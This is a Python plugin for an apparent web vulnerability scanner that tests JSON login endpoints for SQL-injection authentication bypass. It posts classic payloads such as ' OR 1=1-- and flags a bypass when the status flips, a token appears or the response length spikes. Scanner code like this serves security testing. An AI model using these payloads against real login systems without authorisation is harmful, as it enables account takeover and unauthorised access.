from __future__ import annotations

import json
from collections.abc import Mapping
from typing import Any, ClassVar

from juicechain.core.http_client import HttpClient
from juicechain.core.input_point import InputPoint, Location
from juicechain.core.target import join_url
from juicechain.plugins.base import Finding, VulnPlugin
from juicechain.utils.logging import get_logger

logger = get_logger(__name__)

_AUTH_LOGIN_PATH_KEYWORDS: tuple[str, ...] = ("auth", "login", "signin")
_AUTH_PRIMARY_FIELDS: tuple[str, ...] = ("email", "username", "user", "account", "login")


def _try_json(text: str) -> Any | None:
    try:
        return json.loads(text)
    except Exception:
        return None


def _auth_benign_value(param_name: str) -> str:
    pname = (param_name or "").strip().lower()
    if "mail" in pname:
        return "jctest_nonexist@example.com"
    if "pass" in pname:
        return "jctest_wrong_pass_123"
    if any(key in pname for key in ("user", "login", "account", "name")):
        return "jctest_nonexist_user"
    return "jctest_benign_value"


def _contains_auth_token_key(obj: Any) -> bool:
    if not isinstance(obj, Mapping):
        return False
    return ("token" in obj) or ("authentication" in obj)


class Plugin(VulnPlugin):
    name: ClassVar[str] = "AUTH_BYPASS"
    severity: ClassVar[str] = "critical"
    supported_locations: ClassVar[set[Location]] = {"body_json"}

    def _json_group(self, point: InputPoint) -> list[InputPoint]:
        all_points = getattr(self, "_all_points", None)
        if not isinstance(all_points, list):
            return [point]
        out: list[InputPoint] = []
        for candidate in all_points:
            if not isinstance(candidate, InputPoint):
                continue
            if (
                candidate.method == point.method
                and candidate.path == point.path
                and candidate.location == "body_json"
            ):
                out.append(candidate)
        return out or [point]

    def check(
        self,
        base: str,
        point: InputPoint,
        client: HttpClient,
        timeout: float,
        max_bytes: int,
    ) -> Finding | None:
        if not (point.location == "body_json" and point.method == "POST"):
            return None

        param_l = (point.param or "").strip().lower()
        if param_l not in _AUTH_PRIMARY_FIELDS:
            return None

        path_l = (point.path or "").lower()
        if not any(key in path_l for key in _AUTH_LOGIN_PATH_KEYWORDS):
            return None

        group = self._json_group(point)

        first_primary = next(
            (
                (g.param or "").strip().lower()
                for g in group
                if (g.param or "").strip().lower() in _AUTH_PRIMARY_FIELDS
            ),
            param_l,
        )
        if param_l != first_primary:
            return None

        url = join_url(base, point.path)
        base_body: dict[str, Any] = {}
        for g in group:
            pname = (g.param or "").strip()
            if not pname:
                continue
            base_body[pname] = _auth_benign_value(pname)
        if not base_body:
            base_body[point.param] = _auth_benign_value(point.param)

        baseline = client.request(
            "POST",
            url,
            timeout=timeout,
            max_bytes=max_bytes,
            headers={"Content-Type": "application/json"},
            json_data=base_body,
        )
        if not baseline.ok:
            return None

        baseline_status = baseline.status_code
        baseline_text = baseline.text()
        baseline_json = _try_json(baseline_text)
        baseline_has_token = _contains_auth_token_key(baseline_json)

        bypass_payloads = [
            "' OR 1=1--",
            "' OR '1'='1'--",
            "' OR 1=1#",
        ]

        for payload in bypass_payloads:
            bypass_body = dict(base_body)
            bypass_body[point.param] = payload

            bypass = client.request(
                "POST",
                url,
                timeout=timeout,
                max_bytes=max_bytes,
                headers={"Content-Type": "application/json"},
                json_data=bypass_body,
            )
            if not bypass.ok:
                continue

            bypass_status = bypass.status_code
            bypass_text = bypass.text()
            bypass_json = _try_json(bypass_text)
            bypass_has_token = _contains_auth_token_key(bypass_json)

            cond_status_flip = (
                baseline_status is not None
                and baseline_status >= 400
                and bypass_status == 200
            )
            cond_auth_key = bypass_has_token and (not baseline_has_token)
            cond_len_spike = (
                bypass_status == 200
                and len(bypass_text) > (len(baseline_text) * 3)
            )

            if not (cond_status_flip or cond_auth_key or cond_len_spike):
                continue

            evidence = (
                f"login bypass succeeded: baseline status={baseline_status}, "
                f"bypass status={bypass_status}, response contains auth token"
                if bypass_has_token
                else (
                    f"login bypass succeeded: baseline status={baseline_status}, "
                    f"bypass status={bypass_status}"
                )
            )
            logger.info("potential auth bypass finding: path=%s param=%s", point.path, point.param)
            return Finding(
                vuln_type=self.name,
                severity=self.severity,
                evidence=evidence,
                request={
                    "method": "POST",
                    "url": url,
                    "location": point.location,
                    "param": point.param,
                    "payload": payload,
                    "baseline_body": base_body,
                },
                response={
                    "status_code": bypass_status,
                    "content_type": bypass.content_type(),
                    "time_ms": bypass.response_time_ms,
                    "baseline_status": baseline_status,
                    "baseline_length": len(baseline_text),
                    "bypass_length": len(bypass_text),
                },
            )

        return None
